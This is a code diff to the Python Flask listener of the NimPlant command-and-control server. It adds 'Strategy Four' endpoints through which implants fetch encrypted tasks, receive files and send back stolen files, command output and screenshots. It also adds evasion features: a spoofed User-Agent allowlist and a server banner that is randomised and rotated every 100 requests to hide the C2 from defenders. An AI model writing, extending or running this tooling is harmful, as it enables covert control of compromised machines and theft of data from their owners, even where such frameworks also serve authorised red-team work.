@@ -24,7 +24,7 @@ try:
     # userAgent = config["nimplant"]["userAgent"]
     # Adding a list of permitted user agents such that the server checks after every request whether the useragent fro mthe request is permitted
     allowedUserAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+        "NimPlant C2 Client", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
         "Android/11 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
         "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
         "Linux/x86_64 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -142,6 +142,7 @@ def flaskListener(xor_key):
             if flask.request.headers.get("User-Agent") in allowedUserAgents:
                 # Encrypt the state of strategy
                 strategyTwoEnabledEncyrpted = encryptData(str(np_server.strategyTwoEnabled), np.cryptKey)
+                strategyFourEnabledEncyrpted = encryptData(str(np_server.strategyFourEnabled), np.cryptKey)
 
                 # Update the external IP address if it changed
                 if not np.ipAddrExt == getExternalIp(flask.request):
@@ -152,13 +153,13 @@ def flaskListener(xor_key):
                     np.checkIn()
                     task = encryptData(str(np.getNextTask()), np.cryptKey)
                     # Return task and strategy status
-                    return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted), 200
+                    return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s4=strategyFourEnabledEncyrpted), 200
                 else:
                     # There is no task - check in to update 'last seen'
                     if np.isActive():
                         np.checkIn()
                     # Return task and strategy status
-                    return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted), 200
+                    return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted, s4=strategyFourEnabledEncyrpted), 200
             else:
                 notifyBadRequest(
                     getExternalIp(flask.request),
@@ -322,6 +323,199 @@ def flaskListener(xor_key):
             )
             return flask.jsonify(status="Not found"), 404
 
+    """ Strategy Four Endpoints START """
+    @app.route("/zero", methods=["GET"])
+    # Return the first active task IF the user-agent is as expected
+    def getTaskStrategyFour():
+        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        if np is not None:
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
+                # Encrypt the state of strategy
+                strategyTwoEnabledEncyrpted = encryptData(str(np_server.strategyTwoEnabled), np.cryptKey)
+                strategyFourEnabledEncyrpted = encryptData(str(np_server.strategyFourEnabled), np.cryptKey)
+
+                # Update the external IP address if it changed
+                if not np.ipAddrExt == getExternalIp(flask.request):
+                    np.ipAddrExt = getExternalIp(flask.request)
+
+                if np.pendingTasks:
+                    # There is a task - check in to update 'last seen' and return the task
+                    np.checkIn()
+                    task = encryptData(str(np.getNextTask()), np.cryptKey)
+                    # Return task and strategy status
+                    return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s4=strategyFourEnabledEncyrpted), 200
+                else:
+                    # There is no task - check in to update 'last seen'
+                    if np.isActive():
+                        np.checkIn()
+                    # Return task and strategy status
+                    return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted,
+                                         s4=strategyFourEnabledEncyrpted), 200
+            else:
+                notifyBadRequest(
+                    getExternalIp(flask.request),
+                    flask.request.method,
+                    flask.request.path,
+                    flask.request.headers.get("User-Agent"),
+                )
+                return flask.jsonify(status="Not found"), 404
+        else:
+            notifyBadRequest(
+                getExternalIp(flask.request),
+                flask.request.method,
+                flask.request.path,
+                flask.request.headers.get("User-Agent"),
+            )
+            return flask.jsonify(status="Not found"), 404
+
+    @app.route("/zero" + "/<fileId>", methods=["GET"])
+    # Return a hosted file as gzip-compressed stream for the 'upload' command,
+    # IF the user-agent is as expected AND the caller knows the file ID
+    def uploadFileStrategyFour(fileId):
+        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        if np is not None:
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
+                if (np.hostingFile != None) and (
+                        fileId == hashlib.md5(np.hostingFile.encode("utf-8")).hexdigest()
+                ):
+                    try:
+                        # Construct a GZIP stream of the file to upload in-memory
+                        # Note: We 'double-compress' here since compression has little use after encryption,
+                        #       but we want to present the file as a GZIP stream anyway
+                        taskGuid = flask.request.headers.get("X-Unique-ID")
+                        with open(np.hostingFile, mode="rb") as contents:
+                            processedFile = encryptData(
+                                compress(contents.read()), np.cryptKey
+                            )
+
+                        with io.BytesIO() as data:
+                            with gzip.GzipFile(fileobj=data, mode="wb") as zip:
+                                zip.write(processedFile.encode("utf-8"))
+                            gzippedResult = data.getvalue()
+
+                        np.stopHostingFile()
+
+                        # Return the GZIP stream as a response
+                        res = flask.make_response(gzippedResult)
+                        res.mimetype = "application/x-gzip"
+                        res.headers["Content-Encoding"] = "gzip"
+                        return res
+
+                    except Exception as e:
+                        # Error: Could not host the file
+                        nimplantPrint(
+                            f"An error occurred while uploading file:\n{type(e)}:{e}",
+                            np.guid,
+                            taskGuid=taskGuid,
+                        )
+                        np.stopHostingFile()
+                        return flask.jsonify(status="Not found"), 404
+                else:
+                    # Error: The Nimplant is not hosting a file or the file ID is incorrect
+                    return flask.jsonify(status="OK"), 200
+            else:
+                # Error: The user-agent is incorrect
+                notifyBadRequest(
+                    getExternalIp(flask.request),
+                    flask.request.method,
+                    flask.request.path,
+                    flask.request.headers.get("User-Agent"),
+                )
+                return flask.jsonify(status="Not found"), 404
+        else:
+            # Error: No Nimplant with the given GUID is currently active
+            notifyBadRequest(
+                getExternalIp(flask.request),
+                flask.request.method,
+                flask.request.path,
+                flask.request.headers.get("User-Agent"),
+            )
+            return flask.jsonify(status="Not found"), 404
+
+    @app.route("/zero" + "/u", methods=["POST"])
+    # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
+    def downloadFileStrategyFour():
+        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        if np is not None:
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
+                if np.receivingFile != None:
+                    try:
+                        taskGuid = flask.request.headers.get("X-Unique-ID")
+                        uncompressed_file = gzip.decompress(
+                            decryptBinaryData(flask.request.data, np.cryptKey)
+                        )
+                        with open(np.receivingFile, "wb") as f:
+                            f.write(uncompressed_file)
+                        nimplantPrint(
+                            f"Successfully downloaded file to '{os.path.abspath(np.receivingFile)}' on NimPlant server.",
+                            np.guid,
+                            taskGuid=taskGuid,
+                        )
+
+                        np.stopReceivingFile()
+                        return flask.jsonify(status="OK"), 200
+                    except Exception as e:
+                        nimplantPrint(
+                            f"An error occurred while downloading file: {e}",
+                            np.guid,
+                            taskGuid=taskGuid,
+                        )
+                        np.stopReceivingFile()
+                        return flask.jsonify(status="Not found"), 404
+                else:
+                    return flask.jsonify(status="OK"), 200
+            else:
+                notifyBadRequest(
+                    getExternalIp(flask.request),
+                    flask.request.method,
+                    flask.request.path,
+                    flask.request.headers.get("User-Agent"),
+                )
+                return flask.jsonify(status="Not found"), 404
+        else:
+            notifyBadRequest(
+                getExternalIp(flask.request),
+                flask.request.method,
+                flask.request.path,
+                flask.request.headers.get("User-Agent"),
+            )
+            return flask.jsonify(status="Not found"), 404
+
+    @app.route("/zone", methods=["POST"])
+    # Parse command output IF the user-agent is as expected
+    def getResultStrategyFour():
+        data = flask.request.json
+        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+        if np is not None:
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
+                res = json.loads(decryptData(data["data"], np.cryptKey))
+                data = base64.b64decode(res["result"]).decode("utf-8")
+
+                # Handle Base64-encoded, gzipped PNG file (screenshot)
+                if data.startswith("H4sIAAAA") or data.startswith("H4sICAAAA"):
+                    data = processScreenshot(np, data)
+
+                np.setTaskResult(res["guid"], data)
+                return flask.jsonify(status="OK"), 200
+            else:
+                notifyBadRequest(
+                    getExternalIp(flask.request),
+                    flask.request.method,
+                    flask.request.path,
+                    flask.request.headers.get("User-Agent"),
+                )
+                return flask.jsonify(status="Not found"), 404
+        else:
+            notifyBadRequest(
+                getExternalIp(flask.request),
+                flask.request.method,
+                flask.request.path,
+                flask.request.headers.get("User-Agent"),
+            )
+            return flask.jsonify(status="Not found"), 404
+
+    """ Strategy Four Endpoints END """
+
     @app.errorhandler(Exception)
     def all_exception_handler(error):
         nimplantPrint(
@@ -329,29 +523,41 @@ def flaskListener(xor_key):
         )
         return flask.jsonify(status="Not found"), 404
 
+    def identGenerator():
+        # Set of possible server names
+        possibleNames = ["Apache", "IIS", "Nginx", "Lighttpd", "NetWare", "GWS", "Domino"]
+
+        # Choose one random name
+        randomNumber = random.randint(0, 6)
+        chosenName = possibleNames[randomNumber]
+
+        # Choose random version numbers
+        nr1 = random.randint(0, 8)
+        nr2 = random.randint(0, 10)
+        nr3 = random.randint(0, 15)
+
+        # Return randomly generated servername
+        return chosenName + "/" + str(nr1) + "." + str(nr2) + "." + str(nr3)
+
     @app.after_request
     def changeserver(response):
-
+        # If strategy one activated, then generate random server name otherwise use fixed server name
         if np_server.strategyOneEnabled:
-            # Set of possible server names
-            possibleNames = ["Apache", "IIS", "Nginx", "Lighttpd", "NetWare", "GWS", "Domino"]
-
-            # Choose one random name
-            randomNumber = random.randint(0, 6)
-            chosenName = possibleNames[randomNumber]
-
-            # Choose random version numbers
-            nr1 = random.randint(0, 8)
-            nr2 = random.randint(0, 10)
-            nr3 = random.randint(0, 15)
-
-            # Set randomly generated servername
-            ident = chosenName + "/" + str(nr1) + "." + str(nr2) + "." + str(nr3)
+            if np_server.numberOfRequests == 0 and np_server.ident == "NimPlant C2 Server":
+                np_server.ident = identGenerator()
+            # If a certain amount of requests is reached, then change server name and restart counting, iteration starts with 0 therefore n-1 has to be set as termination condition
+            elif np_server.numberOfRequests == 99:
+                np_server.ident = identGenerator()
+                np_server.numberOfRequests = 0
+            # Else keep the same server name
+            else:
+                np_server.numberOfRequests = np_server.numberOfRequests + 1
         else:
-            ident = "Apache/2.2.14"
+            np_server.numberOfRequests = 0
+            np_server.ident = "NimPlant C2 Server"
 
         # Server name defined
-        response.headers["Server"] = ident
+        response.headers["Server"] = np_server.ident
         return response
 
     # Run the Flask web server using Gevent
